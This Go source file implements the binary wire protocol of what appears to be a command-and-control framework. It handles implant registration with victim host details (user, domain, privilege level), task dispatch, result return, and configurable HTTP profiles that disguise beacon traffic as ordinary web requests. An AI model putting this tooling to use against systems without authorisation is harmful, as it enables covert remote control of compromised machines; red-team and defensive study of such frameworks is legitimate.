package naxwire

// Implements the wire frame layout from docs/protocol/wire-v0.md:
//   +--------+----------+-------------------+------------------+
//   | type:1 | flags:1  | bodylen:4 (LE)    | body bytes       |
//   +--------+----------+-------------------+------------------+

import (
	"encoding/binary"
	"errors"
)

// Message types - see docs/protocol/wire-v0.md §"Message types"
const (
	WireTypeRegister  byte = 0x01
	WireTypeHeartbeat byte = 0x02
	WireTypeResult    byte = 0x03
	WireTypeNoTasks   byte = 0x80
	WireTypeTask      byte = 0x81
	WireTypeProfile   byte = 0x82
)

// EncodeFrame builds a wire frame: type, flags=0, bodylen LE u32, body bytes.
func EncodeFrame(msgType byte, body []byte) []byte {
	out := make([]byte, 6+len(body))
	out[0] = msgType
	out[1] = 0 // flags reserved
	binary.LittleEndian.PutUint32(out[2:6], uint32(len(body)))
	copy(out[6:], body)
	return out
}

// DecodeFrame splits a frame into its components. Returns (type, flags, body, err).
func DecodeFrame(frame []byte) (byte, byte, []byte, error) {
	if len(frame) < 6 {
		return 0, 0, nil, errors.New("nax-wire: frame shorter than 6-byte header")
	}
	msgType := frame[0]
	flags := frame[1]
	bodyLen := int(binary.LittleEndian.Uint32(frame[2:6]))
	if 6+bodyLen > len(frame) {
		return 0, 0, nil, errors.New("nax-wire: body truncated relative to declared length")
	}
	return msgType, flags, frame[6 : 6+bodyLen], nil
}

// RegisterBody is the decoded form of a wire-v0 REGISTER body.
type RegisterBody struct {
	Hostname string
	Username string
	Arch     byte
	Pid      uint32
	SleepMs  uint32
	// Extended fields (appended after SleepMs in wire-v0.1+)
	Tid         uint32 // Thread ID (GetCurrentThreadId)
	Ip          string // Internal IPv4 e.g. "192.168.1.5"
	Domain      string // Windows domain or "WORKGROUP"
	ProcessName string // Short image name e.g. "notepad.exe" (optional, wire-v0.2+)
	// System info fields (wire-v0.3+)
	Elevated  byte   // 1 = elevated/admin
	OsMajor   uint32 // Windows major version
	OsMinor   uint32 // Windows minor version
	OsBuild   uint16 // Windows build number
	ParentPid uint32 // Parent process ID
	Acp       uint32 // ANSI code page
	OemCp     uint32 // OEM code page
	ImgPath   string // Full image path (UTF-8)
}

// DecodeRegister parses the body of a REGISTER message per docs/protocol/wire-v0.md §"REGISTER body".
// Extended fields (Tid, Ip, Domain) are optional - omitted by older implants;
// the decoder accepts both and leaves unread fields at their zero values.
func DecodeRegister(body []byte) (RegisterBody, error) {
	var r RegisterBody
	cursor := 0

	hostname, cursor, err := readLenPrefixedString(body, cursor)
	if err != nil {
		return r, err
	}
	r.Hostname = hostname

	username, cursor, err := readLenPrefixedString(body, cursor)
	if err != nil {
		return r, err
	}
	r.Username = username

	if cursor+1+4+4 > len(body) {
		return r, errors.New("nax-wire: REGISTER body truncated at fixed tail")
	}
	r.Arch = body[cursor]
	cursor++
	r.Pid = binary.LittleEndian.Uint32(body[cursor : cursor+4])
	cursor += 4
	r.SleepMs = binary.LittleEndian.Uint32(body[cursor : cursor+4])
	cursor += 4

	// Extended fields - present only when the implant sends them.
	// tid(4LE)
	if cursor+4 <= len(body) {
		r.Tid = binary.LittleEndian.Uint32(body[cursor : cursor+4])
		cursor += 4
	}
	// ip_len(2LE) + ip
	if cursor+2 <= len(body) {
		if ip, newCursor, ipErr := readLenPrefixedString(body, cursor); ipErr == nil {
			r.Ip = ip
			cursor = newCursor
		}
	}
	// domain_len(2LE) + domain
	if cursor+2 <= len(body) {
		if domain, newCursor, domErr := readLenPrefixedString(body, cursor); domErr == nil {
			r.Domain = domain
			cursor = newCursor
		}
	}
	// proc_len(2LE) + proc (optional, wire-v0.2+)
	if cursor+2 <= len(body) {
		if proc, newCursor, procErr := readLenPrefixedString(body, cursor); procErr == nil {
			r.ProcessName = proc
			cursor = newCursor
		}
	}
	// System info fields (wire-v0.3+): elevated(1) + os_major(4) + os_minor(4) + os_build(2) + parent_pid(4) + acp(4) + oem_cp(4) + img_path_len(2)+img_path
	if cursor+1 <= len(body) {
		r.Elevated = body[cursor]
		cursor++
	}
	if cursor+4 <= len(body) {
		r.OsMajor = binary.LittleEndian.Uint32(body[cursor : cursor+4])
		cursor += 4
	}
	if cursor+4 <= len(body) {
		r.OsMinor = binary.LittleEndian.Uint32(body[cursor : cursor+4])
		cursor += 4
	}
	if cursor+2 <= len(body) {
		r.OsBuild = binary.LittleEndian.Uint16(body[cursor : cursor+2])
		cursor += 2
	}
	if cursor+4 <= len(body) {
		r.ParentPid = binary.LittleEndian.Uint32(body[cursor : cursor+4])
		cursor += 4
	}
	if cursor+4 <= len(body) {
		r.Acp = binary.LittleEndian.Uint32(body[cursor : cursor+4])
		cursor += 4
	}
	if cursor+4 <= len(body) {
		r.OemCp = binary.LittleEndian.Uint32(body[cursor : cursor+4])
		cursor += 4
	}
	if cursor+2 <= len(body) {
		if img, newCursor, imgErr := readLenPrefixedString(body, cursor); imgErr == nil {
			r.ImgPath = img
			cursor = newCursor
		}
	}
	_ = cursor
	return r, nil
}

func readLenPrefixedString(body []byte, cursor int) (string, int, error) {
	if cursor+2 > len(body) {
		return "", 0, errors.New("nax-wire: length-prefixed string: header truncated")
	}
	n := int(binary.LittleEndian.Uint16(body[cursor : cursor+2]))
	cursor += 2
	if cursor+n > len(body) {
		return "", 0, errors.New("nax-wire: length-prefixed string: body truncated")
	}
	s := string(body[cursor : cursor+n])
	cursor += n
	return s, cursor, nil
}

// EncodeTaskBody builds the body of a wire TASK frame:
//
//	task_id(4LE) || cmdData
//
// cmdData contains cmd_id(1) || args_len(4LE) || args as assembled by
// the server's PackTasks. Wrap the result in EncodeFrame(WireTypeTask, ...).
func EncodeTaskBody(taskId uint32, cmdData []byte) []byte {
	out := make([]byte, 4+len(cmdData))
	binary.LittleEndian.PutUint32(out[0:4], taskId)
	copy(out[4:], cmdData)
	return out
}

// DecodeResultBody parses the body of a wire-v0 RESULT frame per
// docs/protocol/wire-v0.md §"RESULT body".
//
//	task_id(4LE) | status(1) | data_len(4LE) | data
func DecodeResultBody(body []byte) (taskId uint32, status byte, data []byte, err error) {
	if len(body) < 9 {
		return 0, 0, nil, errors.New("nax-wire: RESULT body too short (need ≥9 bytes)")
	}
	taskId = binary.LittleEndian.Uint32(body[0:4])
	status = body[4]
	dataLen := int(binary.LittleEndian.Uint32(body[5:9]))
	if 9+dataLen > len(body) {
		return 0, 0, nil, errors.New("nax-wire: RESULT body data field truncated")
	}
	return taskId, status, body[9 : 9+dataLen], nil
}

// EncodeProfileBodyV1 builds the body of a v1 PROFILE frame from config fields.
// Kept for backward compat - new code should use EncodeProfileBodyV2.
func EncodeProfileBodyV1(getUris, postUris, userAgents, headers []string, cookieName string, rotation byte) []byte {
	var buf []byte

	writeStringList := func(strs []string) {
		b := make([]byte, 2)
		binary.LittleEndian.PutUint16(b, uint16(len(strs)))
		buf = append(buf, b...)
		for _, s := range strs {
			lb := make([]byte, 2)
			binary.LittleEndian.PutUint16(lb, uint16(len(s)))
			buf = append(buf, lb...)
			buf = append(buf, []byte(s)...)
		}
	}

	writeStringList(getUris)
	writeStringList(postUris)
	writeStringList(userAgents)
	writeStringList(headers)

	// cookie name
	cb := make([]byte, 2)
	binary.LittleEndian.PutUint16(cb, uint16(len(cookieName)))
	buf = append(buf, cb...)
	buf = append(buf, []byte(cookieName)...)

	// rotation
	buf = append(buf, rotation)

	return buf
}

/* ========= [ Profile v2 types ] ========= */

type OutputConfig struct {
	Format    string // "raw", "base64", "base64url", "hex"
	Mask      bool
	Placement string // "body", "header", "cookie", "parameter"
	Name      string
	Prepend   string
	Append    string
	EmptyResp string
}

type HTTPTransaction struct {
	URIs          []string
	ClientHeaders map[string]string
	ClientParams  map[string]string
	ClientMeta    OutputConfig
	ClientOutput  *OutputConfig // POST only (nil for GET)
	ServerHeaders map[string]string
	ServerOutput  OutputConfig
}

type ServerError struct {
	Status  int
	Body    string
	Headers map[string]string
}

type ProfileConfig struct {
	Hosts          []string
	UserAgent      string
	Rotation       string
	BeaconIdHeader string
	Error          ServerError
	Get            HTTPTransaction
	Post           HTTPTransaction
}

/* ========= [ Profile v2 wire helpers ] ========= */

func writeLP(buf *[]byte, s string) {
	b := make([]byte, 2)
	binary.LittleEndian.PutUint16(b, uint16(len(s)))
	*buf = append(*buf, b...)
	*buf = append(*buf, []byte(s)...)
}

func writeOutputConfig(buf *[]byte, cfg *OutputConfig) {
	formatMap := map[string]byte{"raw": 0, "base64": 1, "base64url": 2, "hex": 3}
	placementMap := map[string]byte{"body": 0, "header": 1, "cookie": 2, "parameter": 3}
	fmtByte := formatMap[cfg.Format]
	placeByte := placementMap[cfg.Placement]
	maskByte := byte(0)
	if cfg.Mask {
		maskByte = 1
	}
	*buf = append(*buf, fmtByte, maskByte, placeByte)
	writeLP(buf, cfg.Name)
	writeLP(buf, cfg.Prepend)
	writeLP(buf, cfg.Append)
	writeLP(buf, cfg.EmptyResp)
}

func writeStringList(buf *[]byte, strs []string) {
	b := make([]byte, 2)
	binary.LittleEndian.PutUint16(b, uint16(len(strs)))
	*buf = append(*buf, b...)
	for _, s := range strs {
		writeLP(buf, s)
	}
}

func writeHeaderMap(buf *[]byte, hdrs map[string]string) {
	entries := make([]string, 0, len(hdrs))
	for k, v := range hdrs {
		entries = append(entries, k+": "+v)
	}
	writeStringList(buf, entries)
}

/* ========= [ Profile v2 encoder ] ========= */

// EncodeProfileBodyV2 serializes a ProfileConfig into the v2 binary wire format.
func EncodeProfileBodyV2(p *ProfileConfig) []byte {
	var buf []byte
	buf = append(buf, 0x02) // version
	rot := byte(0)
	if p.Rotation == "random" {
		rot = 1
	}
	buf = append(buf, rot)

	writeLP(&buf, p.UserAgent)
	beaconHdr := p.BeaconIdHeader
	if beaconHdr == "" {
		beaconHdr = "X-Beacon-Id"
	}
	writeLP(&buf, beaconHdr)
	writeStringList(&buf, p.Hosts)

	// server error
	eb := make([]byte, 2)
	binary.LittleEndian.PutUint16(eb, uint16(p.Error.Status))
	buf = append(buf, eb...)
	writeLP(&buf, p.Error.Body)
	writeHeaderMap(&buf, p.Error.Headers)

	// GET block
	writeStringList(&buf, p.Get.URIs)
	writeOutputConfig(&buf, &p.Get.ClientMeta)
	writeHeaderMap(&buf, p.Get.ClientHeaders)
	// client params as "key=value" strings
	paramStrs := make([]string, 0, len(p.Get.ClientParams))
	for k, v := range p.Get.ClientParams {
		paramStrs = append(paramStrs, k+"="+v)
	}
	writeStringList(&buf, paramStrs)
	writeOutputConfig(&buf, &p.Get.ServerOutput)
	writeHeaderMap(&buf, p.Get.ServerHeaders)

	// POST block
	writeStringList(&buf, p.Post.URIs)
	writeOutputConfig(&buf, &p.Post.ClientMeta)
	postOutput := p.Post.ClientOutput
	if postOutput == nil {
		postOutput = &OutputConfig{Format: "raw", Placement: "body"}
	}
	writeOutputConfig(&buf, postOutput)
	writeHeaderMap(&buf, p.Post.ClientHeaders)
	writeOutputConfig(&buf, &p.Post.ServerOutput)
	writeHeaderMap(&buf, p.Post.ServerHeaders)

	return buf
}
